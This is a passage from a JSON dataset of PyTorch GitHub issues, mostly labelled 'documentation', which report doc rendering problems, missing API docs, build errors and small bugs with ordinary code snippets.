7.4.0-1ubuntu1~18.04.1) 7.4.0\r\nCMake version: version 3.10.2\r\n\r\nPython version: 3.7\r\nIs CUDA available: No\r\nCUDA runtime version: No CUDA\r\nGPU models and configuration: No CUDA\r\nNvidia driver version: No CUDA\r\ncuDNN version: No CUDA\r\n\r\nVersions of relevant libraries:\r\n[pip] Could not collect\r\n[conda] cpuonly                   1.0                           0    pytorch\r\n[conda] pytorch                   1.2.0               py3.7_cpu_0  [cpuonly]  pytorch\r\n[conda] torchvision               0.4.0                  py37_cpu  [cpuonly]  pytorch\r\n"},{"labels":["documentation",null,null,null],"text":"![Screen Shot 2019-10-09 at 10 55 32 AM](https://user-images.githubusercontent.com/45861273/66507093-6a818800-ea83-11e9-8333-28ee3b918e4b.png)\r\n\r\n\r\nthis is in the supported operations list on quantization.rst\n\ncc @jerryzh168 @jianyuh @dzhulgakov"},{"labels":[null,"documentation",null],"text":"In tutorial https://pytorch.org/tutorials/beginner/blitz/autograd_tutorial.html\r\nunder Gradients\r\n\r\n![jac](https://user-images.githubusercontent.com/20665510/66342644-88f26100-e967-11e9-9e34-3811148d5ca4.PNG)\r\n\r\n\n\ncc @ezyang"},{"labels":["documentation",null,null,null],"text":"<img width=\"794\" alt=\"convrelu2d-nits\" src=\"https://user-images.githubusercontent.com/45861273/66273545-b46f3180-e829-11e9-8204-8babdf30f1bd.png\">\r\n\r\nI have two concerns here;\r\n\r\n#1 -- highlighted with two squares on the image -- it seems like when we say we use the same args as another function we should have a link to the documentation on the other function. \r\n\r\n#2 -- highlighted with ovals on the image -- in the docstring this is written as \"same as ...\" but in the doc it takes the first word and puts it in parenthesis after the rest.  Not sure why that is happening. \r\n\r\nIf I am reading the gitjhub correctly @dskhudia  is the author of this bit of the code. Perhaps he can help. \n\ncc @jerryzh168 @jianyuh @dzhulgakov"},{"labels":[null,"documentation",null,null,null,null],"text":"<img width=\"798\" alt=\"formatting-issue-either-or\" src=\"https://user-images.githubusercontent.com/45861273/66273196-95bb6b80-e826-11e9-8cd8-8fcb2a2759dd.png\">\r\n\n\ncc @jerryzh168 @jianyuh @dzhulgakov @raghuramank100"},{"labels":["documentation",null],"text":"## 📚 Documentation\r\n\r\nSpotted quite a few grammar and punctuation issues while reading the main README.md file, would like to fix as my first contribution to Pytorch.\r\n\r\nA few of these issues include:\r\n\r\n - L148: \"They **requires** JetPack 4.2 and above and are maintained by @dusty-nv\r\n\"\r\n- L127 \"There is no wrapper code that needs to be written.\" — fix \"No wrapper code needs to be written.\"\r\n\r\nAnd more.\r\n"},{"labels":["documentation",null,null,null],"text":"just missing a colon. the fix is \r\n\r\ngit diff\r\ndiff --git a/docs/source/quantization.rst b/docs/source/quantization.rst\r\nindex e318ead0a0..092ec45fa4 100644\r\n--- a/docs/source/quantization.rst\r\n+++ b/docs/source/quantization.rst\r\n@@ -383,5 +383,5 @@ DeQuantize\r\n\r\n Linear\r\n ------------------\r\n-.. autoclass: Linear\r\n+.. autoclass:: Linear\r\n     :members:\r\n\n\ncc @jerryzh168 @jianyuh @dzhulgakov"},{"labels":["documentation",null,null,null],"text":"<img width=\"1475\" alt=\"escape-character-end-of-workflows\" src=\"https://user-images.githubusercontent.com/45861273/66262462-8fc97a00-e795-11e9-962d-48075ab8a07c.png\">\r\n\n\ncc @jerryzh168 @jianyuh @dzhulgakov"},{"labels":["documentation",null,null,null],"text":"<img width=\"1475\" alt=\"formatting-in-operation-coverage\" src=\"https://user-images.githubusercontent.com/45861273/66262438-ba670300-e794-11e9-9ff3-7f37800bc8ca.png\">\r\n\n\ncc @jerryzh168 @jianyuh @dzhulgakov"},{"labels":["documentation",null,null],"text":"reviewing the draft quantization documentation. \r\n\r\nhttps://htmlpreview.github.io/?https://raw.githubusercontent.com/gottbrath/pytorch/temp-review-quant-doc/docs/review-doc/html/nn.html#quantized-functions\r\n\r\nhere is what this looks like now. I think it needs a little more textual context. \r\n\r\n<img width=\"1475\" alt=\"torch nn-quantization-section-needs-text\" src=\"https://user-images.githubusercontent.com/45861273/66262401-a66ed180-e793-11e9-9677-f87d70f2828f.png\">\r\n\n\ncc @jerryzh168 @jianyuh @dzhulgakov"},{"labels":["documentation",null,null,null],"text":"<img width=\"883\" alt=\"observer-docstring-issue\" src=\"https://user-images.githubusercontent.com/45861273/66261525-cd250c00-e783-11e9-9c6d-b8eabb4a1b8f.png\">\r\n\n\ncc @jerryzh168 @jianyuh @dzhulgakov"},{"labels":[null,null,null,"documentation",null],"text":"There are no docs for `ctx.save_for_backward`. No found links have docs for `save_for_backward` itself: https://pytorch.org/docs/master/search.html?q=save_for_backward&check_keywords=yes&area=default\r\n\r\nIt would be good if these new docs mentioned that it has no effect in no_grad mode and does not needlessly hold onto tensors: https://discuss.pytorch.org/t/save-for-backward-in-no-grad-mode/57316\r\n\r\nProbably `saved_tensors` is not formally documented either.\n\ncc @ezyang @gchanan @zou3519 @SsnL @albanD @gqchen"},{"labels":["documentation",null,null],"text":"When I checkout the [`quantization_1_3_doc` branch](https://github.com/gottbrath/pytorch/tree/quantization_1_3_doc/docs), run make html from /docs, and look at the index.html, all the old quantization docs show up even though the [index.rst ](https://github.com/gottbrath/pytorch/blob/quantization_1_3_doc/docs/source/index.rst)lists quantization.rst. \r\n\r\nDid some testing and research and it looks like it's because in quantization.rst there are multiple H1 headers. We would need to decrease all the headers except the first by one level. \r\n\r\n![image](https://user-images.githubusercontent.com/8042156/66173258-1b130600-e604-11e9-914c-7f3e2b874aa7.png)\r\n"},{"labels":["documentation",null,null,null],"text":"\r\n![image-from-design-doc](https://user-images.githubusercontent.com/45861273/66162193-ba270600-e5e2-11e9-835f-354f5aac7934.png)\r\n\n\ncc @jerryzh168 @jianyuh @dzhulgakov"},{"labels":["documentation",null],"text":"[torch.Tensor.mean](https://pytorch.org/docs/master/tensors.html#torch.Tensor.mean) is documented to sometimes return a tuple, but [torch.mean](https://pytorch.org/docs/master/torch.html#torch.mean) is not. "},{"labels":[null,"documentation",null,null],"text":"add quantized tensor creation functions on torch.tensor( ) documentation, add the torch.quantize_per_tensor() and torch.quantize_per_channel(). \r\n\r\n\r\n@raghuramank100 for visibility"},{"labels":["documentation",null,null],"text":"Create a table listing which methods work on the quantized tensors (only a subset of the tensor methods work). "},{"labels":["documentation",null],"text":"## 📚 Documentation\r\n\r\n`Tensor.scatter_add_` states that the indices need to be unique, but this appears not to be the case (note that this comment is missing from `gather()` docs):\r\n> Moreover, as for gather(), the values of index must be between 0 and self.size(dim) - 1 inclusive, and all values in a row along the specified dimension dim must be unique.\r\n\r\nHowever:\r\n```\r\nimport torch\r\nx = torch.zeros(5)\r\nx.scatter_add_(0, torch.tensor([0, 0, 4]), torch.tensor([1., 3., 5.]))\r\nprint(x) . # => [4, 0, 0, 0, 5]\r\n```\r\n\r\nAlso, if the indices need to be unique, `scatter_add_` would be an incorrect backwards pass for `gather()`, whose indices do not need to be unique, according to current docs.\r\n\r\nDocs at:\r\nhttps://pytorch.org/docs/stable/tensors.html#torch.Tensor.scatter_add_\r\n"},{"labels":["documentation",null,null],"text":"Raghu and I were talking and it would be good to add some color commentary to the torch.quantized.modules.floatFunctional entry explaining why this exits (rather than adding an add in the nn module). This came up in some of the developer feedback on the API. Knowing the design considerations might help people understand why they have to take this step. "},{"labels":["documentation",null,null],"text":"\r\n"},{"labels":["documentation",null,null,null],"text":"This issue drifted a bit. What was finally fixed was the missing set of docs for the fused functions in torch.nn.intrinsic \r\n\r\noriginal description: \r\nThe doc for ConvBn2d is missing. I see it in the rst file and I can get the docstring with a print on the class's __doc__ attribute in pytorch. \r\n\r\n<img width=\"1725\" alt=\"missing-function-ConvBn2d\" src=\"https://user-images.githubusercontent.com/45861273/65708330-30f05c00-e043-11e9-9502-a35464191e19.png\">\r\n"},{"labels":["documentation",null,null],"text":"the parameters for the FakeQuantize function aren't showing up right. \r\n<img width=\"897\" alt=\"Screen Shot 2019-09-25 at 1 12 06 PM\" src=\"https://user-images.githubusercontent.com/45861273/65636145-99353400-df96-11e9-9e0f-4c6b79b7ac91.png\">\r\n"},{"labels":["documentation",null,null],"text":"`torch.add` looks like the following on master.\r\n![image](https://user-images.githubusercontent.com/5652049/65623521-fda3c380-df95-11e9-8c8e-7ad9868af9b7.png)\r\n\r\nIf I am understanding type promotion correctly, we can now add arbitrarily-typed scalars to arbitrarily-typed tensors, so the docs are now incorrect.\r\n\r\ncc @nairbv "},{"labels":[null,null,"documentation",null],"text":"## 🚀 Feature\r\nProvide pytorch traced model graph syntax specification.\r\n\r\n## Motivation\r\nWe plan to deploy pytorch on our inference platform.\r\nSo far the only path is pytorch --> onnx --> target platform.\r\nBut this path may break in sometimes.\r\nWe want to parse pytorch traced model to target platform directly.\r\nWe can see traced model have it's syntax, tokens define, but there's no document can refer.\r\nLike this graph output:\r\ngraph(%x : Tensor) {\r\n  %5 : bool = prim::Constant[value=1]()\r\n  %1 : int = prim::Constant[value=0]()\r\n  %result.1 : Tensor = aten::select(%x, %1, %1)\r\n  %4 : int = aten::size(%x, %1)\r\n  %result : Tensor = prim::Loop(%4, %5, %result.1)\r\n    block0(%i : int, %7 : Tensor) {\r\n      %10 : Tensor = aten::select(%x, %1, %i)\r\n      %result.2 : Tensor = aten::mul(%7, %10)\r\n      -> (%5, %result.2)\r\n    }\r\n  return (%result);\r\n}\r\n\r\nThe tokens, the built-in functions the syntax, without a clear document we can't build a correct parser which support all torch-traced model.\r\n\r\n\r\nThanks\r\n8086\r\n\n\ncc @suo"},{"labels":["documentation",null],"text":"https://pytorch.org/docs/stable/torch.html?highlight=generator#torch._C.Generator\r\n\r\nis called as `torch.Generator`. However it is strange `torch._C.Generator` as user-facing name in docs."},{"labels":["documentation",null,null],"text":"\r\nThe convert function\r\n\r\n`\r\n\r\ndef convert(module, mapping=DEFAULT_MODULE_MAPPING):\r\n    r\"\"\"Converts the float module with observers(where we can get quantization\r\n    parameters) to a quantized module.\r\n    Args:\r\n        module: calibrated module with observers\r\n        mapping: a dictionary that maps from float module type to quantized\r\n           module type, can be overwrritten to allow swapping user defined Modules\r\n    \"\"\"\r\n    reassign = {}\r\n    # TODO(jerryzh): remove after deciding on the impl of intrinsic modules\r\n    SWAPPABLE_MODULES = (nni.ConvBn2d,\r\n                         nni.ConvBnReLU2d,\r\n                         nni.LinearReLU,\r\n                         nni.ConvReLU2d)\r\n\r\n    for name, mod in module.named_children():\r\n        if type(mod) not in SWAPPABLE_MODULES:\r\n            convert(mod, mapping)\r\n        reassign[name] = swap_module(mod, mapping)\r\n\r\n    for key, value in reassign.items():\r\n        module._modules[key] = value\r\n`\r\n\r\nends up looking funny. \r\n\r\n\r\n![Screen Shot 2019-09-19 at 10 07 52 AM](https://user-images.githubusercontent.com/45861273/65265554-0ee85e00-dac6-11e9-843f-03e6d6b3b46a.png)\r\n\r\nI think there are two things here:\r\n\r\n1. do we want to restate the default module mapping in the function args this way? It doesn't seem clear.\r\n\r\n2. the rendering for the function arguments is strange. Is that simply because there isn't an empty  line before args?\r\n\r\n"},{"labels":["documentation",null,null],"text":"the code looks like\r\n\r\ndef add_quant_dequant(module):\r\n    r\"\"\"Wrap the leaf child module in QuantWrapper if it has a valid qconfig\r\n    Note that this function will modify the children of module inplace and it\r\n    can return a new module which wraps the input module as well.\r\n\r\n    Args:\r\n        module: input module with qconfig attributes for all the leaf modules\r\n        that we want to quantize\r\n\r\n    Return:\r\n        Either the inplace modified module with submodules wrapped in\r\n        `QuantWrapper` based on qconfig or a new `QuantWrapper` module which\r\n        wraps the input module, the latter case only happens when the input\r\n        module is a leaf module and we want to quantize it.\r\n    \"\"\"\r\n    if len(module._modules) == 0 and hasattr(module, 'qconfig') and module.qconfig:\r\n        return QuantWrapper(module)\r\n\r\n    for name, child in module.named_children():\r\n        module._modules[name] = add_quant_dequant(child)\r\n    return module\r\n\r\nwhich is rendering strangely here:\r\n\r\n![Screen Shot 2019-09-19 at 10 00 35 AM](https://user-images.githubusercontent.com/45861273/65264949-992fc280-dac4-11e9-88db-ebc0775b47ce.png)\r\n"},{"labels":["documentation",null,null],"text":"the rst file says\r\n\r\ntorch.quantization.observer\r\n---------------------------\r\n.. autoclass:: ObserverBase\r\n.. autofunction::  _calculate_qparams\r\n.. autoclass:: MinMaxObserver\r\n\r\n\r\n\r\nthe .py file says\r\n\r\n\r\nclass ObserverBase(ABC, nn.Module):\r\n    r\"\"\"Observer base Module\r\n    Any concrete observer implementation should derive from this class.\r\n\r\n    Concrete observers should follow the same API. In forward, they will update\r\n    the statistics of the observed Tensor. And they should provide a\r\n    `calculate_qparams` function that computes the quantization parameters given\r\n    the collected statistics.\r\n    \"\"\"\r\n\r\n\r\nso I would expect to see doc here:\r\n\r\n\r\n\r\n![Screen Shot 2019-09-19 at 8 55 59 AM](https://user-images.githubusercontent.com/45861273/65260635-85cc2980-dabb-11e9-8bf4-bfbff5620771.png)\r\n"},{"labels":[null,"documentation",null,null,null],"text":"## 📚 Documentation\r\n\r\nTraining a model with `torch.autograd.set_detect_anomaly(True)` causes a severe memory leak because every line of code that is executed is stored in memory as a string. As far I as know, this memory leak isn't documented anywhere. The documentation for `set_detect_anomaly` should be updated with a warning.\n\ncc @ezyang @gchanan @zou3519"},{"labels":[null,"documentation",null,null],"text":"# I want to generate a static library file that calls libtorch， but report errors:\r\n“torch/script.h”: No such file or dire\r\n# My CMakeLists.txt is:\r\ncmake_minimum_required(VERSION 3.12 FATAL_ERROR)\r\nproject(detector )\r\nset( CMAKE_CXX_FLAGS \"-std=c++11\" )\r\nfind_package(Torch REQUIRED)\r\ninclude_directories( ${Torch_INCLUDE_DIRS} )\r\ninclude_directories(D:\\\\libtorch\\\\include\\\\torch)\r\nmessage(STATUS \"Pytorch status:\")\r\nmessage(STATUS \"    libraries: ${TORCH_LIBRARIES}\")\r\nmessage(STATUS \"    include_dirs: ${Torch_INCLUDE_DIRS}\")\r\nadd_library(detector src/detector.cpp)\r\n# Run the following command:\r\ncmake -DCMAKE_PREFIX_PATH=D:\\libtorch ..\r\nIn the output information, {Torch_INCLUDE_DIRS} is None.\r\ncmake --build .\r\nreport error: “torch/script.h”: No such file or dire\r\n\r\nIs my cmake file wrong? \r\nHope get your help, thanks!\r\n\n\ncc @peterjc123"},{"labels":[null,"documentation",null],"text":"## 📚 Documentation\r\nThe documentation for F.dropout should probably mention that putting the model in eval mode doesn't disable dropout.\r\n\r\nA small example\r\n```python\r\nimport torch\r\nimport torch.nn as nn\r\nimport torch.nn.functional as F\r\n\r\nclass Net(nn.Module):\r\n    def __init__(self):\r\n        super(Net, self).__init__()\r\n\r\n    def forward(self, x):\r\n        x = F.dropout(x)\r\n        return x\r\n\r\nnet = Net()                                                             \r\n\r\na = torch.ones(10)                                                     \r\n\r\nnet(a)                                                                  \r\ntensor([0., 0., 0., 2., 2., 2., 0., 0., 2., 2.]) \r\n\r\nnet.eval()\r\n\r\nnet(a)\r\ntensor([0., 0., 0., 2., 2., 2., 0., 0., 2., 2.])\r\n\r\n\r\n```\r\n\r\nIf the model is set in eval mode, the dropout layer is not disabled.\r\nis_training should take care of this.. But it may be better if this behavior is explicitly mentioned in the docs.\r\n"},{"labels":[null,"documentation",null,null],"text":"Here is how I was thinking we would organize the quantization documentation .. primarily so that the quantization stuff all ends up together but is navigable from places like \"nn\" where some of the functions end up. \r\n\r\nFirst, here is what the early preview looks like .. as a baseline\r\n![what it looks like now](https://user-images.githubusercontent.com/45861273/64991361-96478e80-d886-11e9-9b36-ee5ecd02f74d.png)\r\n\r\nThen here is how I would change that page (mostly the navigation)\r\n![MOck up 1](https://user-images.githubusercontent.com/45861273/64991381-a19aba00-d886-11e9-905f-50430af9d223.png)\r\n\r\nThen here is how I would add a section to the .nn section linking back to the quantization doc. \r\n\r\n![In other places where the code lives like nn](https://user-images.githubusercontent.com/45861273/64991407-a9f2f500-d886-11e9-96e3-4a00998279f3.png)\r\n\r\n\n\ncc @ezyang"},{"labels":["documentation",null,null],"text":"## 🐛 Bug\r\n\r\nLooking at a preview of the sphinx generated documentation and the list of modules that can be fused is not clear. Perhaps some list notation or other punctuation would help. \r\n\r\nFuses only the following sequence of modules: conv, bn conv, bn, relu All other sequences are left unchanged.\r\n\r\nMissing some kind of separator between the first sequence and the second sequence. I think it is missing a period at the end of the sentence as well. \r\n\r\n\r\n\r\nI think the items that are fused are\r\nconv, bn\r\nconf, bn, relu\r\n\r\ndoes it also fuse \r\nconv, relu\r\n\r\n?\r\n\r\n![Screen Shot 2019-09-16 at 1 12 02 PM](https://user-images.githubusercontent.com/45861273/64990209-364fe880-d884-11e9-81e1-33bcc93b11f8.png)\r\n\r\n## To Reproduce\r\n\r\nJessica and Bruce did an early doc build for us. \r\n\r\n\r\n"},{"labels":["documentation",null,null],"text":"Just simple question, does PyTorch 1.2 support autograd on sparse multiplication or not yet, like sparse times dense? I see there are some open issues tracking the support for sparse tensors, like\r\n\r\nhttps://github.com/pytorch/pytorch/issues/2389\r\nhttps://github.com/pytorch/pytorch/issues/3158\r\nhttps://github.com/pytorch/pytorch/issues/8853\r\n\r\nBut I get lost after reading all these."},{"labels":["documentation",null],"text":"## 🐛 Bug\r\n\r\nGPU memory can't be released when using a try-except statement for CUDA out of memory.\r\n\r\n## To Reproduce\r\n\r\n```\r\nimport gc\r\nimport numpy as np\r\nimport torch\r\nimport torch.nn as nn\r\n\r\nclass MyModel(nn.Module):\r\n    def __init__(self, *embeddings):\r\n        super(MyModel, self).__init__()\r\n        self.embeddings = nn.ModuleList()\r\n        for embedding in embeddings:\r\n            embedding = torch.as_tensor(embedding)\r\n            embedding = nn.Embedding.from_pretrained(embedding, freeze=True)\r\n            self.embeddings.append(embedding)\r\n\r\ndevice = \"cuda\"\r\nembeddings = [np.zeros((5000000, 1000))] * 3\r\nmodel = MyModel(*embeddings)\r\n\r\ntry:\r\n    model = model.to(device)\r\nexcept RuntimeError: # CUDA out of memory\r\n    print(\"GPU memory overflow. Use CPU instead.\")\r\n    del model\r\n    gc.collect()\r\n    torch.cuda.empty_cache()\r\n```\r\n\r\n## Expected behavior\r\n\r\nWhen `MyModel` is a single layer like `torch.nn.Linear`, the code releases most GPU memory and results in about 900MB in nvidia-smi.\r\n\r\nWhen `MyModel` is a custom model like the above module list, no GPU memory is released and it results in about 10GB in nvidia-smi.\r\n\r\n## Environment\r\n\r\nPyTorch version: 1.1.0\r\nIs debug build: No\r\nCUDA used to build PyTorch: 10.0.130\r\n\r\nOS: CentOS Linux release 7.6.1810 (Core)\r\nGCC version: (GCC) 7.3.0\r\nCMake version: version 3.14.5\r\n\r\nPython version: 3.7\r\nIs CUDA available: Yes\r\nCUDA runtime version: 10.0.130\r\nGPU models and configuration:\r\nGPU 0: Tesla V100-SXM2-16GB\r\nGPU 1: Tesla V100-SXM2-16GB\r\nGPU 2: Tesla V100-SXM2-16GB\r\nGPU 3: Tesla V100-SXM2-16GB\r\n\r\nNvidia driver version: 418.67\r\ncuDNN version: Could not collect\r\n\r\nVersions of relevant libraries:\r\n[pip] numpy==1.16.4\r\n[pip] torch==1.1.0\r\n[pip] torchbiggraph==1.dev1\r\n[pip] torchvision==0.3.0\r\n[conda] mkl                       2019.4                      243\r\n[conda] pytorch                   1.1.0           py3.7_cuda10.0.130_cudnn7.5.1_0    pytorch\r\n[conda] torchbiggraph             1.dev1                    <pip>\r\n[conda] torchvision               0.3.0           py37_cu10.0.130_1    pytorch\r\n"},{"labels":[null,"documentation",null],"text":"## 📚 Documentation\r\n\r\nThe [documentation for the negative binomial distribution](https://pytorch.org/docs/stable/_modules/torch/distributions/negative_binomial.html) is ambiguous. \r\n\r\nThe wording implies that PyTorch's negative binomial distribution describes the total number of trials before a set number of failures occurs. Really, it describes the total number of *successful* trials before a set number of failures occurs. \r\n\r\nSince negative binomial distributions can be parameterized a bunch of different ways ([see Wikipedia](https://en.wikipedia.org/wiki/Negative_binomial_distribution#Alternative_formulations)), I think PyTorch's docs should be more explicit. Also, PyTorch's negative binomial parameterization is different than [SciPy](https://docs.scipy.org/doc/scipy/reference/generated/scipy.stats.nbinom.html) and also different than Wikipedia, so being extra clear can't hurt.\r\n\r\nI made #25923 to clarify the docstring and describe what PyTorch's implementation is doing. \r\n\n\ncc @vincentqb @fritzo @neerajprad @alicanb @vishwakftw"},{"labels":["documentation",null],"text":"## 📚 Documentation\r\n\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\n\r\nBased on #25706, [toDense](https://pytorch.org/docs/stable/sparse.html#torch.sparse.FloatTensor.toDense) was a typo for [to_dense](https://github.com/pytorch/pytorch/blob/5d3267cd303817e0097a833bbd3f59be35295441/aten/src/ATen/core/TensorBody.h#L702) method but the doc building did not fail. \r\n\r\ncc: @ezyang "},{"labels":[null,null,"documentation",null],"text":"## 📚 Documentation\r\n\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\n\r\nAfter the 1.2 version of pytorch release, the torch::Tensor docs(original url:https://pytorch.org/cppdocs/api/classat_1_1_tensor.html) is missing. it does provide much helpful information about class torch::Tensor. \r\n\r\nIt was there. (https://github.com/pytorch/cppdocs/blob/59620f68901b1e5f6bc2fa30c9ecbe8d0d86a1c4/api/classat_1_1_tensor.html) but in the latest commit, the file is absent.\r\n\r\nIt is really helpful for c++ development. Could you recovery it?\r\n\n\ncc @ezyang @gchanan @zou3519 @yf225"},{"labels":["documentation",null,null],"text":"## 📚 Documentation\r\n\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\nHi,\r\n\r\nIn the [source doc of torch.set_default_tensor_type(t)](https://pytorch.org/docs/stable/_modules/torch.html#set_default_tensor_type), the argument `t` defined using `:attr:` tag but in the [compiled doc of torch.set_default_tensor_type(t)](https://pytorch.org/docs/stable/torch.html#torch.set_default_tensor_type), the `t` argument in the description, refers to [torch.t()](https://pytorch.org/docs/stable/torch.html#torch.t) (transpose) function inaccurately.\r\nI think the source doc is right but I have no idea how the `attr` tag is refering to `func`."},{"labels":["documentation",null],"text":"My IDE gets confused on `output.backward(retain_graph=True)`\r\nBecause `torch/__init__.pyi` (PyTorch 1.2) has the following, `retain_graph` kwarg is missing\r\n\r\n```\r\n    def backward(self, gradient: Optional[Tensor]=None, keep_graph: _bool=False, create_graph: _bool=False) -> None: ...\r\n```\r\n"},{"labels":["documentation",null,null,null],"text":"https://pytorch.org/docs/stable/sparse.html#torch.sparse.FloatTensor.toDense\r\n\r\nIt's not toDense, it's `to_dense`\r\n"},{"labels":["documentation",null,null],"text":"## 📚 Documentation\r\nHi everyone,\r\nI found that the math formulas of \"torch.nn.init.kaiming_uniform_\" and \"torch.nn.init.kaiming_normal_\" are not general enough.\r\nThe complete formula for \"kaiming_uniform_\" should be \r\n\r\n> \\text{bound} = \\text{gain} * \\sqrt{\\frac{3}{\\text{fan}}}\r\n> where gain is gottn from \"calculate_gain\"\r\n\r\nAm I right?\r\n\r\nhttps://pytorch.org/docs/stable/nn.init.html#torch.nn.init.kaiming_uniform_\r\nhttps://pytorch.org/docs/stable/nn.init.html#torch.nn.init.kaiming_normal_"},{"labels":["documentation",null,null,null],"text":"## 📚 Documentation\r\n\r\nThe documentation for `pad_packed_sequence` says \"Batch elements will be ordered decreasingly by their length.\", but that's not true if the packed sequence is created with `enforce_sorted=False`. (It was true before the introduction of `enforce_sorted=False`)\r\n\r\nRather, another statement in the documentation \"It is an inverse operation to pack_padded_sequence()\" is true - the returned tensor is in the same order as it was before being packed.\r\n\r\nTo fix this, simply remove the sentence \"Batch elements will be ordered decreasingly by their length.\".\r\n\n\ncc @zou3519"},{"labels":[null,"documentation",null,null],"text":"## Issue description\r\n\r\n[The instructions on the \"Start Locally\" page](https://pytorch.org/get-started/locally/#linux-from-source) seem to indicate Cuda 8.0 is supported here:\r\n\r\n```sh\r\n# Add LAPACK support for the GPU\r\nconda install -c pytorch magma-cuda80 # or magma-cuda90 if CUDA 9\r\n```\r\n\r\nHowever, when I run the commands specified, I get the following output from `python setup.py install`:\r\n\r\n```\r\n-- Caffe2: CUDA detected: 8.0\r\n-- Caffe2: CUDA nvcc is: /usr/local/cuda/bin/nvcc\r\n-- Caffe2: CUDA toolkit directory: /usr/local/cuda\r\nCMake Error at cmake/public/cuda.cmake:42 (message):\r\n  PyTorch requires CUDA 9.0 and above.\r\nCall Stack (most recent call first):\r\n  cmake/Dependencies.cmake:808 (include)\r\n  CMakeLists.txt:311 (include)\r\n```\r\n\r\nUnless I am missing something, it appears the documentation has fallen out of sync with the latest build. I would love to be told I am wrong and have simply missed a step somewhere, but if Cuda 8.0 is truly no longer supported then, in my opinion, the instructions should be updated to reflect that.\r\n\r\n## System Info\r\n\r\n```\r\nPyTorch version: N/A\r\nIs debug build: N/A\r\nCUDA used to build PyTorch: N/A\r\n\r\nOS: CentOS Linux 7 (Core)\r\nGCC version: (GCC) 4.8.5 20150623 (Red Hat 4.8.5-36)\r\nCMake version: version 3.14.0\r\n\r\nPython version: 3.7\r\nIs CUDA available: N/A\r\nCUDA runtime version: 8.0.61\r\nGPU models and configuration: GPU 0: Tesla C2075\r\nNvidia driver version: 390.87\r\ncuDNN version: Could not collect\r\n\r\nVersions of relevant libraries:\r\n[pip] numpy==1.16.4\r\n[conda] blas                      1.0                         mkl  \r\n[conda] magma-cuda80              2.3.0                         1    pytorch\r\n[conda] mkl                       2019.4                      243  \r\n[conda] mkl-include               2019.4                      243  \r\n[conda] mkl-service               2.0.2            py37h7b6447c_0  \r\n[conda] mkl_fft                   1.0.14           py37ha843d7b_0  \r\n[conda] mkl_random                1.0.2            py37hd81dba3_0\r\n```\r\n\r\nAdditional note: [The instructions for installing the build for 8.0](https://pytorch.org/get-started/locally/#cuda-8x) work on my system, but I am unable to move things into GPU and receive a warning that my GPU is not supported. I suspect this is because my card does not support CuDNN and the default installation for Cuda 8.0 uses CuDNN."},{"labels":["documentation",null],"text":"I searched for all occurrences of RegisterOperators and there are no occurrences of this string in docs."},{"labels":[null,"documentation",null],"text":"## 📚 Documentation\r\n\r\npolygamma appears undocumented\r\n\r\n```\r\n>>> import torch\r\n>>> torch.polygamma\r\n<built-in method polygamma of type object at 0x7f3dc98fc8a0>\r\n>>> help(torch.polygamma)\r\nHelp on built-in function polygamma:\r\n\r\npolygamma(...)\r\n```\r\n\r\nYes [the docs](https://pytorch.org/docs/master/search.html?q=polygamma&check_keywords=yes&area=default) don't seem to mention it.\r\n\r\nIt's also not in our [docs file](https://github.com/pytorch/pytorch/blob/687aa781dfafca0e182560806cc0437007911493/torch/_tensor_docs.py).\n\ncc @vincentqb @fritzo @neerajprad @alicanb @vishwakftw"},{"labels":["documentation",null],"text":"## 🚀 Feature\r\n<!-- A clear and concise description of the feature proposal -->\r\n5-10 minute long simulations before beginning of every tutorial in PyTorch docs.\r\n\r\n## Motivation\r\n<!-- Please outline the motivation for the proposal. Is your feature request related to a problem? e.g., I'm always frustrated when [...]. If this is related to another GitHub issue, please link here too -->\r\n\r\njust like this simulation\r\nhttps://www.youtube.com/watch?v=u7x8RXwLKcA\r\nand\r\nhttps://www.youtube.com/watch?v=auRPXMMHJzc\r\nmore simulations before tutorials\r\n\r\n## Pitch\r\n\r\n<!-- A clear and concise description of what you want to happen. -->\r\n\r\n## Alternatives\r\n\r\n<!-- A clear and concise description of any alternative solutions or features you've considered, if any. -->\r\n\r\n## Additional context\r\n\r\n<!-- Add any other context or screenshots about the feature request here. -->\r\n"},{"labels":[null,"documentation",null],"text":"## 📚 Documentation\r\n\r\nAs done in [tensorflow](https://github.com/tensorflow/datasets#disclaimers), let's add a dataset disclaimer.\r\n\r\n- [x] torchvision pytorch/vision#1249\r\n- [x] torchtext pytorch/text#590\r\n- [x] torchaudio pytorch/audio#247\r\n\r\ncc @SsnL @zhangguanheng66 @fmassa @cpuhrsch "},{"labels":[null,"documentation",null],"text":"## 🐛 Bug\r\n\r\nWhen I create a Normal distribution with uninitialised parameters and initialise them before use they stay fixed. I'm not sure whether this it expected but I found it to be odd and took me some time to catch the difference in initialisations (because this then also lead to samples that were `inf`).\r\n\r\n## To Reproduce\r\n\r\n```\r\nimport torch\r\nimport torch.nn as nn\r\nfrom torch.nn.parameter import Parameter\r\nimport torch.distributions as dist\r\nimport math\r\n\r\nmean = Parameter(torch.Tensor(1, 2))\r\nlog_std = Parameter(torch.Tensor(1, 2))\r\n\r\nn = dist.Normal(mean, torch.exp(log_std))\r\n\r\nnn.init.kaiming_uniform_(mean, a=math.sqrt(5))\r\nnn.init.normal_(log_std, -5)\r\n\r\nprint(n.scale)\r\n```\r\nreturns\r\n`tensor([[1., 1.]], grad_fn=<ExpBackward>)`\r\n## Expected behavior\r\n\r\nWhen initialising the parameters before creating the distribution the scale is correct:\r\n```\r\nimport torch\r\nimport torch.nn as nn\r\nfrom torch.nn.parameter import Parameter\r\nimport torch.distributions as dist\r\nimport math\r\n\r\nmean = Parameter(torch.Tensor(1, 2))\r\nlog_std = Parameter(torch.Tensor(1, 2))\r\n\r\nnn.init.kaiming_uniform_(mean, a=math.sqrt(5))\r\nnn.init.normal_(log_std, -5)\r\n\r\nn = dist.Normal(mean, 